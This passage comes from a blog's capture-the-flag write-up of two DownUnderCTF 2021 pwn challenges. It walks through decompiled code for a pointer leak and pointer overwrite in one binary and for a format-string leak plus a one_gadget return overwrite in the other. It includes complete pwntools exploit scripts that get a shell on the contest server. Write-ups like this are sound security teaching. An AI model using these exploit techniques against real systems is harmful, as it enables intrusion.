    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">1337</span> <span class="p">)</span>
    <span class="p">{</span>
<span class="nl">LABEL_10:</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">set_username</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
      <span class="n">print_username</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>After taking a glance at main function, i would be able to notice something:</p>

<ul>
  <li>
    <p>the program first read my 32 bytes of input into <code class="language-plaintext highlighter-rouge">NAME</code> buffer, but the <code class="language-plaintext highlighter-rouge">NAME</code> buffer also 32 bytes long, and right after that is the pointer (<code class="language-plaintext highlighter-rouge">RANDBUF</code>) to the string <code class="language-plaintext highlighter-rouge">"/dev/urandom"</code></p>
  </li>
  <li>
    <p>when i input the number 1337, the program will lead me to a function called <code class="language-plaintext highlighter-rouge">game</code>, also there are 2 functions called.</p>
  </li>
</ul>

<p>Ok, there are 2 more functions i need to check, the <code class="language-plaintext highlighter-rouge">set_username</code> and <code class="language-plaintext highlighter-rouge">print_username</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">set_username</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">size_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"What would you like to change your username to?"</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">stdin</span><span class="p">;</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">NAME</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fread</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nt</span> <span class="nf">print_username</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="n">NAME</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Hmm, now that the vulnerability showed up, at first the program asked me to input 32 byte which filled up the <code class="language-plaintext highlighter-rouge">NAME</code> buffer entirely, no nullbyte between <code class="language-plaintext highlighter-rouge">RANDBUF</code> and <code class="language-plaintext highlighter-rouge">NAME</code>, so when the program call <code class="language-plaintext highlighter-rouge">print_username</code> it will call <code class="language-plaintext highlighter-rouge">puts</code> function it will print not only my input but also leak the address of <code class="language-plaintext highlighter-rouge">RANDBUF</code>, it means i leaked PIE.</p>

<p>The <code class="language-plaintext highlighter-rouge">set_username</code> read my into <code class="language-plaintext highlighter-rouge">NAME</code> buffer with the length is the return value of <code class="language-plaintext highlighter-rouge">strlen(NAME)</code> function, the <code class="language-plaintext highlighter-rouge">strlen</code> function only stop counting when it reach the nullbyte, but before this i’ve already filled up the <code class="language-plaintext highlighter-rouge">NAME</code> buffer entirely with 32 bytes, which means the <code class="language-plaintext highlighter-rouge">strlen</code> will now read 6 more bytes (length of <code class="language-plaintext highlighter-rouge">RANDBUF</code>’s address) because there are no nullbyte between them, then i’ll be able to input 32 + 6 = 38 bytes, enough to overwrite the address of <code class="language-plaintext highlighter-rouge">RANDBUF</code>.</p>

<p>Now let’s checkout the mysterious <code class="language-plaintext highlighter-rouge">game</code> function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">game</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]</span>
  <span class="kt">int</span> <span class="n">ptr</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">RANDBUF</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
  <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"guess: "</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">get_num</span><span class="p">()</span> <span class="o">==</span> <span class="n">ptr</span> <span class="p">)</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The program will open RANDBUF (<code class="language-plaintext highlighter-rouge">RANDBUF = /dev/urandom</code>) to read the first 4 bytes of it, if i could guess those 4 bytes correctly i’ll have a shell. But why do i have to guess, when i can just overwrite the <code class="language-plaintext highlighter-rouge">RANDBUF</code> pointer, so where do i overwrite <code class="language-plaintext highlighter-rouge">RANDBUF</code> buffer to point to?</p>

<p>I will overwrite it to point right back at the beginning of the <code class="language-plaintext highlighter-rouge">NAME</code> buffer, and i use function <code class="language-plaintext highlighter-rouge">set_username</code> to both rewriting <code class="language-plaintext highlighter-rouge">NAME</code> buffer from garbage into <code class="language-plaintext highlighter-rouge">"flag.txt\0"</code> and overwriting the <code class="language-plaintext highlighter-rouge">RANDBUF</code> pointer, the first 4 bytes of flag.txt is always <code class="language-plaintext highlighter-rouge">DUCT (0x54435544 in little-endian hexa)</code>, that’s a free shell isn’t it? Here’s my exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-2021.duc.tf'</span><span class="p">,</span> <span class="mi">31907</span><span class="p">)</span>
<span class="c1">#io = process('./babygame')
</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">40</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8316</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'flag.txt'</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">))</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1337'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1413698884'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{whats_in_a_name?_5aacfc58}</code></p>

<h1 id="oversight">Oversight</h1>

<p>This challenge is funny, don’t know why but i like it, i also like a heapnote challenge, but somehow i couldnt do it in time, too stupid maybe? Dunno =]]</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">wait</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="c1">// [rsp+Bh] [rbp-85h] BYREF</span>
  <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-80h] BYREF</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Press enter to continue"</span><span class="p">);</span>
  <span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Pick a number: "</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">snprintf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">,</span> <span class="s">"Your magic number is: %%%d$llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">introduce</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">introduce</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Are you ready to echo?"</span><span class="p">);</span>
  <span class="n">get_num_bytes</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"That was fun!"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_num_bytes</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span> <span class="c1">// [rsp+Bh] [rbp-15h] BYREF</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"How many bytes do you want to read (max 256)? "</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Don't break the rules!"</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">echo</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>The program first have format string vulnerability to leak data, which i used to leak libc, when finished leaking libc i overwrite the return pointer of <code class="language-plaintext highlighter-rouge">get_num_bytes</code> function to return to the <code class="language-plaintext highlighter-rouge">one_gadget</code> in libc by stack spraying technique, sometimes it doesn’t work, so if the shell doesn’t pop up just retry a few times, this is my script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#io = process('./oversight', env={"LD_PRELOAD":"./libc-2.27.so"})
</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-2021.duc.tf'</span><span class="p">,</span> <span class="mi">31909</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'15'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your magic number is: '</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8d4d3</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x4f432</span><span class="p">)</span><span class="o">*</span><span class="mi">25</span> <span class="o">+</span> <span class="mi">6</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0\0\0\0\0\0\0</span><span class="s">'</span> <span class="o">+</span><span class="sa">b</span><span class="s">'BBBBBBB'</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'256'</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}</code></p>

<p>Thanks for reading my boring writeup, have a good day fellas =]]</p>

</div>





<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2021/06/07/book-manager-hcmus-writeup.html">
            Book manager writeup [HCMUSCTF2021 Final]
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/05/23/HCMUS-CTF-2021-writeup.html">
            HCMUS CTF 2021 writeup
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2021/04/08/config-dnscrypt-proxy-for-linux.html">
            How to config dnscrypt-proxy for linux?
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/beginner/" class="set-1">beginner</a> <a href="/tag/heap-exploit/" class="set-2">heap exploit</a> <a href="/tag/introduction/" class="set-1">introduction</a> <a href="/tag/picoctf2019/" class="set-1">picoCTF2019</a> <a href="/tag/privacy/" class="set-2">privacy</a> <a href="/tag/pwn/" class="set-5">pwn</a> <a href="/tag/pwnable.tw/" class="set-2">pwnable.tw</a> <a href="/tag/tutorial/" class="set-3">tutorial</a></div>
  



      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
